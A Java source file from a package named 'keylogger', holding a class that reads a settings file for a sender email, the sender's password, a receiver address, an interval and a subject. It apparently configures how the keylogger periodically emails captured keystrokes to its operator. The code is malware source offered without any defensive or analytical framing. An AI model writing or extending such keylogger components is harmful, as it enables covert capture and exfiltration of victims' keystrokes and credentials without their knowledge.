package keylogger;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.swing.JOptionPane;

public class GetSettingsData {
    
    Map<String, String> settings = new HashMap<String, String>();
    
    GetSettingsData(String SettingsPath){
        System.out.println(SettingsPath);
    try{
        java.nio.file.Path path = Paths.get(SettingsPath);
        byte[] bytes = Files.readAllBytes((java.nio.file.Path) path);
        List<String> allLines = Files.readAllLines((java.nio.file.Path) path, StandardCharsets.UTF_8);

        settings.put("SENDER", allLines.get(0).replace("SETTINGS_EMAIL$->","").trim());
        settings.put("SENDER_PASSWORD", allLines.get(1).replace("SETTINGS_Pw$->","").trim());
        settings.put("RECEIVER", allLines.get(2).replace("SETTINGS_RECEIVER$->","").trim());
        settings.put("INTERVAL", allLines.get(3).replace("INTERVAL$->","").trim());
        settings.put("SUBJECT", allLines.get(4).replace("SUBJECT$->","").trim());
    }catch(Exception ex){
        JOptionPane.showMessageDialog(null, ex);
     }
    }
    public Map<String, String> GetSettings(){
        return settings;
    }
}